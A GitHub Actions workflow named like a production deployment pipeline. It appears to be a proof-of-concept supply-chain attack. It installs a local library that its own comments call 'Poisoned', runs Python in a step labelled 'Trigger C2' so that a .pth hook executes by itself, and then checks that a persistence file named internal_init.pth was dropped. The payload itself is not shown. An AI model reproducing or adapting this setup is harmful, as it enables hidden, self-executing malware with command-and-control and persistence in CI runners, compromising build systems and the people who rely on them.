name: Production-Deployment-Pipeline
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Prepare Environment
        run: |
          # Ensure the callback library exists in the runner
          pip install requests --break-system-packages

      - name: Install Company Dependencies
        run: |
          # Install our "Poisoned" library
          pip install ./internal_lib/ --break-system-packages

      - name: Verify Installation & Trigger C2
        run: |
          # This command starts a new Python process, triggering the .pth hook
          python3 -c "print('--- [SYSTEM] Starting Production Authentication Service ---')"

      - name: Forensic Check (Internal Proof)
        run: |
          echo "[*] Searching for persistence hooks..."
          # Locates the .pth file to prove it was successfully dropped
          find /usr/local/lib /usr/lib -name "internal_init.pth" 2>/dev/null || echo "[!] Persistence file not found"
